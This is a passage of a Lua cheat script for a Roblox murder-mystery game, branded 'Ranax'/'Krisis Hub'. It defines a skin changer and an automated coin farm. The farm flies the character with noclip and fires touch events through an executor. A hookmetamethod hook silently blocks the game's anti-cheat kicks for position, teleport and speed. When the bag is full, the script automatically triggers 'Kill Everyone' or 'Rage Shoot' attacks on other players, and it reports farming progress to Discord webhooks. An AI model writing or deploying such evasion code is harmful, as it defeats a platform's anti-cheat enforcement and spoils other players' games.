        Icon = "flame",
        Values = {
            "None",
            "Fire Flame Aura",
            "Ghost Void Smoke",
            "Sparkles / Stars",
            "Lightning Sparks",
            "Blood Drip"
        },
        Value = "None",
        Multi = false,
        AllowNone = false,
        Callback = function(opt)
            _skinChanger.CustomAura = opt
            updateEquippedSkins()
            notify("Skin Changer", "Aura: " .. tostring(opt), 2, "flame")
        end
    })

    SkinChangerTab:Toggle({
        Title = "Neon Weapon Glow",
        Desc = "Emits a vivid neon light and highlight around your weapon",
        Icon = "sun",
        Type = "Checkbox",
        Value = false,
        Callback = function(val)
            _skinChanger.GlowEnabled = val
            updateEquippedSkins()
        end
    })

    SkinChangerTab:Dropdown({
        Title = "Weapon Glow Color",
        Desc = "Customize the neon glow color of your weapon",
        Icon = "palette",
        Values = {
            "Neon Pink",
            "Cyan Blue",
            "Electric Green",
            "Golden Yellow",
            "Blood Red",
            "Purple Violet",
            "Pure White"
        },
        Value = "Neon Pink",
        Multi = false,
        AllowNone = false,
        Callback = function(colName)
            _skinChanger.GlowColor = GlowColorMap[colName] or Color3.fromRGB(255, 0, 128)
            updateEquippedSkins()
        end
    })

    SkinChangerTab:Slider({
        Title = "Weapon Scale",
        Desc = "Adjust the size multiplier of your weapon mesh",
        Step = 0.1,
        Value = {
            Min = 0.7,
            Max = 2.5,
            Default = 1.0
        },
        Callback = function(val)
            _skinChanger.WeaponScale = val
            local char = LocalPlayer.Character
            local bp = LocalPlayer:FindFirstChild("Backpack")
            if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
            if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
            updateEquippedSkins()
        end
    })

    SkinChangerTab:Button({
        Title = "Apply Skins Now",
        Desc = "Manually refresh and apply skins to currently equipped weapons",
        Locked = false,
        Callback = function()
            local char = LocalPlayer.Character
            local bp = LocalPlayer:FindFirstChild("Backpack")
            if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
            if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
            updateEquippedSkins()
            notify("Skin Changer", "Skins refreshed & applied!", 2, "check")
        end
    })

        SkinChangerTab:Section({
        Title = "🌐 Custom Asset ID Changer (UGC / Internet)",
        TextXAlignment = "Left",
        TextSize = 16
    })

    local _customKnifeMesh = "rbxassetid://121946387"
    local _customKnifeTex = "rbxassetid://121946411"

    SkinChangerTab:Input({
        Title = "Custom Mesh ID",
        Desc = "Paste any Roblox MeshId (e.g. rbxassetid://121946387)",
        Value = "rbxassetid://121946387",
        Placeholder = "rbxassetid://...",
        Callback = function(val)
            if val and val ~= "" then
                _customKnifeMesh = val:find("rbxassetid://") and val or ("rbxassetid://" .. val:gsub("%D", ""))
            end
        end
    })

    SkinChangerTab:Input({
        Title = "Custom Texture ID",
        Desc = "Paste any Roblox TextureId (e.g. rbxassetid://121946411)",
        Value = "rbxassetid://121946411",
        Placeholder = "rbxassetid://...",
        Callback = function(val)
            if val and val ~= "" then
                _customKnifeTex = val:find("rbxassetid://") and val or ("rbxassetid://" .. val:gsub("%D", ""))
            end
        end
    })

    SkinChangerTab:Button({
        Title = "Apply Custom Mesh to Knife",
        Desc = "Transforms your equipped knife with the custom IDs above",
        Locked = false,
        Callback = function()
            local char = LocalPlayer.Character
            local bp = LocalPlayer:FindFirstChild("Backpack")
            local tool = (char and char:FindFirstChild("Knife")) or (bp and bp:FindFirstChild("Knife"))
            if tool then
                local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildOfClass("BasePart")
                if handle then
                    local sm = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChild("Mesh")
                    if not sm then
                        sm = Instance.new("SpecialMesh")
                        sm.Name = "Mesh"
                        sm.MeshType = Enum.MeshType.FileMesh
                        sm.Parent = handle
                    end
                    sm.MeshId = _customKnifeMesh
                    sm.TextureId = _customKnifeTex
                    sm.Scale = Vector3.new(_skinChanger.WeaponScale or 1, _skinChanger.WeaponScale or 1, _skinChanger.WeaponScale or 1)
                    handle.Transparency = 0
                    notify("Skin Changer", "Applied Custom Mesh to Knife!", 2, "check")
                end
            else
                notify("Skin Changer", "No Knife found in hand/backpack!", 2, "x")
            end
        end
    })

    SkinChangerTab:Button({
        Title = "Apply Custom Mesh to Gun",
        Desc = "Transforms your equipped gun with the custom IDs above",
        Locked = false,
        Callback = function()
            local char = LocalPlayer.Character
            local bp = LocalPlayer:FindFirstChild("Backpack")
            local tool = (char and char:FindFirstChild("Gun")) or (bp and bp:FindFirstChild("Gun"))
            if tool then
                local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildOfClass("BasePart")
                if handle then
                    local sm = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChild("Mesh")
                    if not sm then
                        sm = Instance.new("SpecialMesh")
                        sm.Name = "Mesh"
                        sm.MeshType = Enum.MeshType.FileMesh
                        sm.Parent = handle
                    end
                    sm.MeshId = _customKnifeMesh
                    sm.TextureId = _customKnifeTex
                    sm.Scale = Vector3.new(_skinChanger.WeaponScale or 1, _skinChanger.WeaponScale or 1, _skinChanger.WeaponScale or 1)
                    handle.Transparency = 0
                    notify("Skin Changer", "Applied Custom Mesh to Gun!", 2, "check")
                end
            else
                notify("Skin Changer", "No Gun found in hand/backpack!", 2, "x")
            end
        end
    })

SkinChangerTab:Button({
        Title = "Reset Weapons to Default",
        Desc = "Removes all custom visual skins and restores original models",
        Locked = false,
        Callback = function()
            _skinChanger.KnifeEnabled = false
            _skinChanger.GunEnabled = false
            _skinChanger.ChromaRainbow = false
            local char = LocalPlayer.Character
            local bp = LocalPlayer:FindFirstChild("Backpack")
            if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then cleanToolVisuals(t); t:SetAttribute("RanaxSkinApplied", nil) end end end
            if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then cleanToolVisuals(t); t:SetAttribute("RanaxSkinApplied", nil) end end end
            notify("Skin Changer", "Restored default weapon models", 2, "refresh-cw")
        end
    })
end
-------------------------------------------------------------------------------------------------------------------
task.wait()
local CoinFarmTab = Window:Tab({
    Title = "Coin Farm",
    Icon = "coins",
    Locked = false,
})

-- ==================== KRISIS HUB COIN FARM ENGINE (FLY ENGINE WITH ENHANCED ROLE ACTIONS & WEBHOOK) ====================
_G.ExecuteKillEveryone = _G.ExecuteKillEveryone or nil
_G.VFling = _G.VFling or nil
_G.getMurderer = _G.getMurderer or nil
_G.getRoleOfPlayer = _G.getRoleOfPlayer or nil
_G.executeRanaxFlickShoot = _G.executeRanaxFlickShoot or nil
_G.executeRanaxRageShoot = _G.executeRanaxRageShoot or nil

-- Client Anti-Kick Interceptor
pcall(function()
    if hookmetamethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if self == LocalPlayer and tostring(method):lower() == "kick" then
                local args = {...}
                local reason = tostring(args[1] or ""):lower()
                if reason:find("position") or reason:find("teleport") or reason:find("invalid") or reason:find("speed") then
                    warn("[RANAX ANTI-KICK] Intercepted kick attempt:", reason)
                    return nil
                end
            end
            return oldNamecall(self, ...)
        end)
    end
end)

_G.SafeAutoFarm = false
_G.AutoCoins = false
_G.FarmSpeed = _G.FarmSpeed or 16
_G.FlyMode = _G.FlyMode or "normal"
_G.CoinFarmAutoReset = _G.CoinFarmAutoReset or false
_G.BagFullAction = _G.BagFullAction or "Auto by Role (Sheriff: Shoot / Innocent: Lobby / Murderer: Kill Everyone)"
_G.FarmStartTime = _G.FarmStartTime or os.time()
_G.FarmTotalCollected = _G.FarmTotalCollected or 0
_G.HasReportedCoins = false
_G.CoinFarmHandlingBagFull = false
_G.CollectedCoins = _G.CollectedCoins or {}

local collectedCoins = {}
local startedCollecting = false
local flying = false

local getChar = function()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end

local function noclipLoop(char)
    task.spawn(function()
        while flying and char and char.Parent do
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
            RunService.Stepped:Wait()
        end
    end)
end

local function restoreChar()
    local char = getChar()
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hum then
        hum.PlatformStand = false
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
    end
    if hrp then
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end
    for _, v in pairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = true
        end
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    _G.CoinFarmHandlingBagFull = false
    _G.HasReportedCoins = false
    _G.RanaxCoinsCollected = 0
    collectedCoins = {}
    startedCollecting = false
    if not flying then return end
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    local hum = char:WaitForChild("Humanoid", 5)
    if not hrp then return end
    local lastPos = hrp.Position
    repeat
        task.wait(0.2)
        if not (char and char.Parent and hrp and hrp.Parent) then break end
        local newPos = hrp.Position
        if (newPos - lastPos).Magnitude > 1 then
            lastPos = newPos
        else
            break
        end
    until not flying
    task.wait(0.3)
    if flying and char.Parent then
        for _, v in pairs(char:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
        noclipLoop(char)
    end
end)

local function getNearestCoin(root)
    local nearest = nil
    local dist = math.huge
    local mode = _G.CoinFarmMode or "Halloween (Candies)"

    for _, v in pairs(workspace:GetDescendants()) do
        local isValidCoin = false
        local isCandy = false

        if v:IsA("BasePart") and v:FindFirstChild("TouchInterest") then
            local n = v.Name:lower()
            if n == "coin_server" or n == "coin" or n == "candy_server" or n == "candy" or n == "candycorn" or n == "pumpkin" then
                isValidCoin = true
                if n:find("candy") or n:find("pumpkin") then
                    isCandy = true
                end
            end
        end

        if isValidCoin and not collectedCoins[v] and not v:GetAttribute("Collected") then
            local shouldTarget = true
            if mode == "Halloween (Candies)" then
                shouldTarget = isCandy
            elseif mode == "Standard (Coins)" then
                shouldTarget = not isCandy
            end

            if shouldTarget then
                local d = (root.Position - v.Position).Magnitude
                if d < dist then
                    dist = d
                    nearest = v
                end
            end
        end
    end

    -- Fallback: If Halloween mode has no candies left, target standard coins to prevent idle
    if not nearest and mode == "Halloween (Candies)" then
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name == "Coin_Server" and v:FindFirstChild("TouchInterest") and not collectedCoins[v] and not v:GetAttribute("Collected") then
                local d = (root.Position - v.Position).Magnitude
                if d < dist then
                    dist = d
                    nearest = v
                end
            end
        end
    end

    return nearest
end

local function flyToCoin(targetPart)
    local char = getChar()
    local hrp = char and char:WaitForChild("HumanoidRootPart", 3)
    local hum = char and char:WaitForChild("Humanoid", 3)
    if not (hrp and hum and hum.Health > 0) then return end
    hum.PlatformStand = true
    local timeout = tick() + 10
    local speed = tonumber(_G.FarmSpeed) or 16

    while flying and char.Parent and targetPart.Parent do
        if tick() > timeout then break end
        if targetPart:GetAttribute("Collected") then break end
        local targetPos = targetPart.Position
        local fMode = _G.FlyMode or "normal"
        if fMode == "down" or _G.UndergroundFarm == true then
            targetPos = targetPos - Vector3.new(0, 3, 0)
        end
        local dir = (targetPos - hrp.Position).Unit
        hrp.AssemblyLinearVelocity = dir * speed
        if fMode == "down" or _G.UndergroundFarm == true then
            hrp.CFrame = CFrame.new(hrp.Position, targetPart.Position) * CFrame.Angles(math.rad(90), 0, 0)
        else
            hrp.CFrame = CFrame.new(hrp.Position, targetPart.Position)
        end

        if typeof(firetouchinterest) == "function" then
            firetouchinterest(hrp, targetPart, 0)
            firetouchinterest(hrp, targetPart, 1)
        end

        if (hrp.Position - targetPos).Magnitude < 2 then
            hrp.CFrame = CFrame.new(targetPos)
            if typeof(firetouchinterest) == "function" then
                firetouchinterest(hrp, targetPart, 0)
                firetouchinterest(hrp, targetPart, 1)
            end
            break
        end
        RunService.RenderStepped:Wait()
    end
    hrp.AssemblyLinearVelocity = Vector3.zero
    collectedCoins[targetPart] = true
    startedCollecting = true
    _G.RanaxCoinsCollected = (_G.RanaxCoinsCollected or 0) + 1
    _G.FarmTotalCollected = (_G.FarmTotalCollected or 0) + 1
end

-- Teleport to Lobby Helper
local function TeleportToLobby()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum and hum.Health > 0) then return end

    hum.PlatformStand = false
    hum.Sit = false
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero

    local targetCFrame = nil
    local lobby = workspace:FindFirstChild("RegularLobby") or workspace:FindFirstChild("Lobby")
    if lobby then
        local spawns = lobby:FindFirstChild("Spawns") or lobby:FindFirstChild("Spawn")
        if spawns then
            for _, s in ipairs(spawns:GetDescendants()) do
                if s:IsA("BasePart") or s:IsA("SpawnLocation") then
                    targetCFrame = s.CFrame + Vector3.new(0, 3.5, 0)
                    break
                end
            end
        end
        if not targetCFrame then
            for _, s in ipairs(lobby:GetDescendants()) do
                if s:IsA("SpawnLocation") or (s.Name:lower():find("spawn") and s:IsA("BasePart")) then
                    targetCFrame = s.CFrame + Vector3.new(0, 3.5, 0)
                    break
                end
            end
        end
        if not targetCFrame then
            targetCFrame = lobby:GetPivot() + Vector3.new(0, 5, 0)
        end
    end
    if not targetCFrame then
        local sp = workspace:FindFirstChild("SpawnLocation", true)
        if sp and sp:IsA("BasePart") then
            targetCFrame = sp.CFrame + Vector3.new(0, 3.5, 0)
        else
            targetCFrame = CFrame.new(-108.5, 140, -11.5)
        end
    end
    if targetCFrame then
        hrp.CFrame = targetCFrame
        task.wait(0.05)
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end
end
_G.TeleportToLobby = TeleportToLobby

local function getCoinBagLive()
    local pgui = LocalPlayer:FindFirstChild("PlayerGui")
    local defaultMax = 40
    pcall(function()
        if MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 151528) then
            defaultMax = 50
        end
    end)
    local tracked = _G.RanaxCoinsCollected or 0
    if not pgui then return tracked, defaultMax, (tracked >= defaultMax) end

    local mg = pgui:FindFirstChild("MainGUI") or pgui:FindFirstChild("MainGui") or pgui:FindFirstChild("Gui")
    if not mg then return tracked, defaultMax, (tracked >= defaultMax) end

    for _, desc in ipairs(mg:GetDescendants()) do
        if desc:IsA("TextLabel") and desc.Visible then
            local txt = desc.Text
            if txt and txt ~= "" then
                local cur, mx = txt:match("(%d+)%s*/%s*(%d+)")
                if cur and mx then
                    local cNum, mNum = tonumber(cur), tonumber(mx)
                    if cNum and mNum and (mNum >= 30 and mNum <= 100) then
                        return cNum, mNum, (cNum >= mNum and cNum >= 30)
                    end
                end

                local pName = (desc.Parent and desc.Parent.Name:lower()) or ""
                local dName = desc.Name:lower()
                if (pName:find("coin") or dName:find("coin") or pName:find("candy") or dName:find("candy") or pName:find("event") or pName:find("hallow")) and txt:match("^%s*[Ff][Uu][Ll][Ll]!*%s*$") then
                    return defaultMax, defaultMax, true
                end
            end
        end
    end

    return tracked, defaultMax, (tracked >= defaultMax)
end
_G.getCoinBagLive = getCoinBagLive

local function IsCoinBagFull()
    local defaultMax = 40
    pcall(function()
        if MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 151528) then
            defaultMax = 50
        end
    end)
    return (_G.RanaxCoinsCollected or 0) >= defaultMax
end

local function executeBagFullAction()
    local role = "INNOCENT"
    local getRole = _G.getRoleOfPlayer
    if typeof(getRole) == "function" then
        role = tostring(getRole(LocalPlayer)):upper()
    else
        local char = LocalPlayer.Character
        local bp = LocalPlayer:FindFirstChild("Backpack")
        local function hasTool(name)
            if char and char:FindFirstChild(name) then return true end
            if bp and bp:FindFirstChild(name) then return true end
            return false
        end
        if hasTool("Knife") or (char and char:FindFirstChildOfClass("Tool") and char:FindFirstChildOfClass("Tool").Name:lower():find("knife")) then
            role = "MURDERER"
        elseif hasTool("Gun") or (char and char:FindFirstChildOfClass("Tool") and char:FindFirstChildOfClass("Tool").Name:lower():find("gun")) then
            role = "SHERIFF"
        end
    end

    local action = _G.BagFullAction or "Auto by Role (Sheriff: Shoot / Innocent: Lobby / Murderer: Kill Everyone)"

    if action:find("Auto") then
        if role == "SHERIFF" then
            notify("Bag Full Action", "Role: Sheriff -> Executing Rage Shoot!", 3, "crosshair")
            task.spawn(function()
                local shootFn = _G.executeRanaxRageShoot
                if typeof(shootFn) == "function" then
                    shootFn()
                end
            end)
        elseif role == "MURDERER" then
            notify("Bag Full Action", "Role: Murderer -> Executing Kill Everyone!", 3, "skull")
            task.spawn(function()
                local killFn = _G.ExecuteKillEveryone
                if typeof(killFn) == "function" then
                    killFn(500)
                end
            end)
        else
            notify("Bag Full Action", "Role: Innocent -> Teleporting to Lobby!", 3, "map-pin")
            task.spawn(function()
                TeleportToLobby()
            end)
        end
    elseif action:find("Rage Shoot") then
        notify("Bag Full Action", "Executing Rage Shoot!", 3, "crosshair")
        task.spawn(function()
            local shootFn = _G.executeRanaxRageShoot
            if typeof(shootFn) == "function" then
                shootFn()
            end
        end)
    elseif action:find("Kill Everyone") then
        notify("Bag Full Action", "Executing Kill Everyone!", 3, "skull")
        task.spawn(function()
            local killFn = _G.ExecuteKillEveryone
            if typeof(killFn) == "function" then
                killFn(500)
            end
        end)
    elseif action:find("Lobby") then
        notify("Bag Full Action", "Teleporting to Lobby!", 3, "map-pin")
        task.spawn(function()
            TeleportToLobby()
        end)
    elseif action:find("Reset") then
        notify("Bag Full Action", "Resetting Character!", 3, "refresh-cw")
        local char = LocalPlayer.Character
        if char then char:BreakJoints() end
    end
end

-- Krisis Hub Auto Farm Master Loop
task.spawn(function()
    while true do
        local ok, err = pcall(function()
            if not flying then
                task.wait(0.25)
                return
            end

            local char = getChar()
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not (char and char.Parent and hum and root and hum.Health > 0 and char:IsDescendantOf(workspace)) then
                startedCollecting = false
                task.wait(1)
                return
            end

            -- Check Bag Full condition
            if IsCoinBagFull() then
                if not _G.CoinFarmHandlingBagFull then
                    _G.CoinFarmHandlingBagFull = true
                    flying = false
                    _G.SafeAutoFarm = false
                    _G.AutoCoins = false
                    restoreChar()

                    -- Send Discord Webhook report
                    if _G.WebhookEnabled and not _G.HasReportedCoins then
                        _G.HasReportedCoins = true
                        local diff = os.time() - (_G.FarmStartTime or os.time())
                        local tStr = string.format("%dD %dH %dM %dS",
                            math.floor(diff/86400), math.floor((diff%86400)/3600),
                            math.floor((diff%3600)/60), diff%60)
                        local bagValue, maxBag = getCoinBagLive()
                        local totalC = (_G.FarmTotalCollected or 0)
                        task.spawn(function()
                            if typeof(_G.sendCoinWebhook) == "function" then
                                pcall(_G.sendCoinWebhook, bagValue > 0 and bagValue or maxBag, maxBag, totalC, tStr, "Bag Full")
                            end
                        end)
                    end

                    -- Trigger Bag Full Action (Sheriff: Shoot / Innocent: Lobby / Murderer: Kill Everyone)
                    executeBagFullAction()
                end
                task.wait(1)
                return
            end

            local coin = getNearestCoin(root)
            if coin then
                flyToCoin(coin)
            else
                if _G.CoinFarmAutoReset and startedCollecting then
                    if char then char:BreakJoints() end
                    task.wait(2)
                    startedCollecting = false
                end
                task.wait(0.1)
            end
        end)

        if not ok then
            warn("[Ranax Krisis CoinFarm] Error: " .. tostring(err))
            task.wait(0.5)
        end
        task.wait(0.01)
    end
end)
-- removed unclosed end


-- ==================== COIN STATS & TRACKER ====================
local function purgeCoinTrackerHUD()
    pcall(function()
        if getgenv().RanaxTrackerGui and getgenv().RanaxTrackerGui.Parent then
            pcall(function() getgenv().RanaxTrackerGui:Destroy() end)
        end
        getgenv().RanaxTrackerGui = nil
        getgenv().RanaxTracker_Bag = nil
        getgenv().RanaxTracker_Total = nil
        getgenv().RanaxTracker_Rate = nil
        getgenv().RanaxTracker_Time = nil
        getgenv().RanaxTrackerDot = nil

        local containers = {}
        if typeof(gethui) == "function" then
            pcall(function() table.insert(containers, gethui()) end)
        end
        pcall(function() table.insert(containers, game:GetService("CoreGui")) end)
        if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then
            table.insert(containers, LocalPlayer.PlayerGui)
        end

        for _, c in ipairs(containers) do
            if c then
                for _, obj in ipairs(c:GetChildren()) do
                    if obj.Name == "RanaxCoinTrackerHUD" or obj.Name == "TrackerFrame" then
                        pcall(function() obj:Destroy() end)
                    elseif obj:IsA("ScreenGui") and obj:FindFirstChild("TrackerFrame") then
                        pcall(function() obj:Destroy() end)
                    end
                end
            end
        end
    end)
end
purgeCoinTrackerHUD()

_G.FarmStartTime = _G.FarmStartTime or os.time()
_G.FarmTotalCollected = _G.FarmTotalCollected or 0
_G.FarmLastSessionBag = _G.FarmLastSessionBag or 0
_G.FarmCoinsThisMinute = 0
_G.FarmRateLastMinute = 0
_G.FarmRateTimer = os.time()
_G.LastWebhookCoinMilestone = _G.LastWebhookCoinMilestone or 0
_G.LastMilestoneSentTime = 0
_G.RanaxCoinsCollected = _G.RanaxCoinsCollected or 0  -- direct counter, no UI parsing needed

-- Late-binding proxy: always calls whatever sendCoinWebhook is at call-time
_G.sendCoinWebhook = _G.sendCoinWebhook or function(...)
    -- Will be replaced by real impl below; this is a safe no-op placeholder
end

local function fmtTime(diff)
    if not diff or diff < 0 then diff = 0 end
    if diff < 60 then return diff .. "s"
    elseif diff < 3600 then return math.floor(diff/60) .. "m " .. (diff%60) .. "s"
    else
        return math.floor(diff/3600) .. "h " .. math.floor((diff%3600)/60) .. "m"
    end
end

task.spawn(function()
    while true do
        task.wait(1)
        -- If Coin Farm and Tracker GUI are inactive, DO NOT scan GUI descendants!
        if not (_G.SafeAutoFarm or _G.AutoCoins or getgenv().RanaxTrackerGui) then
            task.wait(2)
        else
            pcall(function()
                local bagValue, maxBag = getCoinBagLive()
            local now = os.time()

            -- Detect bag dump (round end/reset) → add to total
            local lastBag = _G.FarmLastSessionBag or 0
            if bagValue < lastBag and lastBag > 1 then
                _G.FarmTotalCollected = (_G.FarmTotalCollected or 0) + lastBag
                _G.HasReportedCoins = false
                _G.FarmSessionBagCurrent = 0
            end
            -- Detect coin gain → track for rate
            if bagValue > lastBag then
                _G.FarmCoinsThisMinute = (_G.FarmCoinsThisMinute or 0) + (bagValue - lastBag)
            end
            _G.FarmLastSessionBag = bagValue

            -- Total lifetime coins collected in this session
            local currentSessionTotal = (_G.FarmTotalCollected or 0) + bagValue

            -- Rate: update every 60 seconds
            local elapsed60 = now - (_G.FarmRateTimer or now)
            if elapsed60 >= 60 then
                _G.FarmRateLastMinute = _G.FarmCoinsThisMinute or 0
                _G.FarmCoinsThisMinute = 0
                _G.FarmRateTimer = now
            end

            -- === EVERY 10 COINS WEBHOOK MILESTONE ===
            -- Uses _G.RanaxCoinsCollected (incremented directly in farm loop)
            -- so it works even when getCoinBagLive() returns 0
            local trackedTotal = _G.RanaxCoinsCollected or 0
            if _G.WebhookEnabled and trackedTotal > 0 then
                local nextMilestone = (_G.LastWebhookCoinMilestone or 0) + 10
                if trackedTotal >= nextMilestone and (now - (_G.LastMilestoneSentTime or 0) > 3) then
                    _G.LastWebhookCoinMilestone = math.floor(trackedTotal / 10) * 10
                    _G.LastMilestoneSentTime = now
                    local diff = now - (_G.FarmStartTime or now)
                    local tStr = fmtTime(diff)
                    local bv, mb = bagValue, maxBag
                    task.spawn(function()
                        if typeof(_G.sendCoinWebhook) == "function" then
                            _G.sendCoinWebhook(bv, mb > 0 and mb or 40, trackedTotal, tStr,
                                "🪙 " .. tostring(_G.LastWebhookCoinMilestone) .. " Coins Collected")
                        end
                    end)
                end
            end

            -- === LEVEL UP DETECTOR ===
            local curLvl = (typeof(_G.getPlayerLevel) == "function") and _G.getPlayerLevel() or 0
            if curLvl > 0 then
                if not _G.RanaxLastKnownLevel then
                    _G.RanaxLastKnownLevel = curLvl
                elseif curLvl > _G.RanaxLastKnownLevel then
                    local oldL = _G.RanaxLastKnownLevel
                    _G.RanaxLastKnownLevel = curLvl
                    task.spawn(function()
                        if _G.sendLevelUpWebhook then
                            _G.sendLevelUpWebhook(oldL, curLvl)
                        end
                        notify("Level Up", "Level Up! " .. tostring(oldL) .. " ➔ " .. tostring(curLvl), 3.5, "award")
                    end)
                end
            end
        end)
        end
    end
end)

CoinFarmTab:Divider()

CoinFarmTab:Section({
    Title = "Auto Farm Controls",
    TextSize = 15
})

if _G.UndergroundFarm == nil then _G.UndergroundFarm = false end
if _G.CoinFarmMode == nil then _G.CoinFarmMode = "Halloween (Candies)" end

UIElements.SafeAutoFarm = CoinFarmTab:Toggle({
    Title = "Enable Safe Coin Farm",
    Desc = "Krisis Hub Fly Coin Farm & Noclip engine",
    Icon = "coins",
    Type = "Checkbox",
    Value = _G.SafeAutoFarm or false,
    Callback = function(val)
        _G.SafeAutoFarm = val
        _G.AutoCoins = val
        flying = val
        collectedCoins = {}
        startedCollecting = false
        if val then
            _G.CoinFarmHandlingBagFull = false
            _G.HasReportedCoins = false
            _G.RanaxCoinsCollected = 0
            if not _G.FarmStartTime or _G.FarmStartTime == 0 then
                _G.FarmStartTime = os.time()
            end
            local char = getChar()
            noclipLoop(char)
            notify("Coin Farm", "Krisis Fly Coin Farm Enabled (Active)", 2, "coins")
        else
            restoreChar()
            notify("Coin Farm", "Coin Farm Disabled", 2, "coins")
        end
    end,
})

if _G.CoinFarmMode == nil then _G.CoinFarmMode = "Halloween (Candies)" end

UIElements.CoinFarmMode = CoinFarmTab:Dropdown({
    Title = "Farm Mode",
    Desc = "Choose target currency: Halloween Candies, Standard Coins, or Both",
    Values = {"Halloween (Candies)", "Standard (Coins)", "Auto / All (Coins + Candies)"},
    Value = _G.CoinFarmMode or "Halloween (Candies)",
    Callback = function(val)
        _G.CoinFarmMode = val
        _G.BlacklistedCoins = {}
        notify("Coin Farm", "Mode: " .. tostring(val), 2, "sparkles")
    end
})

UIElements.FlyMode = CoinFarmTab:Dropdown({
    Title = "Fly Mode",
    Desc = "Normal (direct flight) or Down (underground approach from below)",
    Values = {"normal", "down"},
    Value = _G.FlyMode or "normal",
    Callback = function(val)
        _G.FlyMode = val
        _G.UndergroundFarm = (val == "down")
        notify("Coin Farm", "Fly Mode set to: " .. tostring(val), 2, "navigation")
    end
})

UIElements.CoinFarmKeybind = CoinFarmTab:Keybind({
    Title = "Coin Farm Keybind",
    Desc = "Keybind to toggle Safe Coin Farm ON / OFF (Press Delete for None)",
    Value = KeybindValues.CoinFarmKeybind or "None",
    Callback = function(v)
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            KeybindValues.CoinFarmKeybind = "None"
            pcall(function() if UIElements.CoinFarmKeybind and UIElements.CoinFarmKeybind.SetValue then UIElements.CoinFarmKeybind:SetValue("None") end end)
            return
        end
        local keyName = typeof(v) == "EnumItem" and v.Name or tostring(v):gsub("Enum.KeyCode.", "")
        KeybindValues.CoinFarmKeybind = keyName
        local newState = not (_G.SafeAutoFarm or false)
        if UIElements.SafeAutoFarm and UIElements.SafeAutoFarm.SetValue then
            pcall(function() UIElements.SafeAutoFarm:SetValue(newState) end)
        else
            _G.SafeAutoFarm = newState
            _G.AutoCoins = newState
            notify("Coin Farm", "Safe Coin Farm " .. (newState and "Enabled" or "Disabled"), 2, "coins")
        end
    end
})

UIElements.CoinESPToggle = CoinFarmTab:Toggle({
    Title = "Coin ESP",
    Desc = "Highlights spawned coins and displays distance through walls",
    Icon = "eye",
    Type = "Checkbox",
    Value = _G.CoinESPEnabled or false,
    Callback = function(val)
        _G.CoinESPEnabled = val
        if typeof(_G.toggleCoinESP) == "function" then
            _G.toggleCoinESP(val)
        end
        if UIElements.ESPCoinToggle and UIElements.ESPCoinToggle.SetValue then
            pcall(function() UIElements.ESPCoinToggle:SetValue(val) end)
        end
        notify("Coin ESP", "Coin ESP " .. (val and "Enabled" or "Disabled"), 2, "coins")
    end,
})

UIElements.FarmSpeed = CoinFarmTab:Slider({
    Title = "Farm Speed",
    Desc = "Smooth tween movement speed (Safe Anti-Kick max 24 studs/sec)",
    Step = 1,
    Value = {
        Min = 10,
        Max = 24,
        Default = 24,
    },
    Callback = function(val)
        _G.FarmSpeed = math.clamp(val, 10, 24)
    end
})

UIElements.AntiStuck = CoinFarmTab:Toggle({
    Title = "Anti-Stuck",
    Desc = "Automatically skips coin if stuck or unreachable within timeout",
    Icon = "shield-alert",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
        _G.CoinFarmAntiStuck = state
        notify("Coin Farm", "Anti-Stuck " .. (state and "ON" or "OFF"), 2, "shield-alert")
    end,
})

UIElements.AntiStuckTimeout = CoinFarmTab:Slider({
    Title = "Anti-Stuck Timeout",
    Desc = "Seconds before skipping unreachable coin",
    Step = 0.5,
    Value = {
        Min = 1.5,
        Max = 6,
        Default = 2.5,
    },
    Callback = function(val)
        _G.CoinFarmAntiStuckTimeout = val
    end,
})

CoinFarmTab:Button({
    Title = "Teleport to Lobby",
    Desc = "Safely teleports character back to Lobby",
    Locked = false,
    Callback = function()
        TeleportToLobby()
        notify("Coin Farm", "Teleported to Lobby", 2, "map-pin")
    end
})

CoinFarmTab:Button({
    Title = "Reset Tracker Stats",
    Desc = "Resets elapsed timer and total collected count",
    Locked = false,
    Callback = function()
        _G.FarmStartTime = os.time()
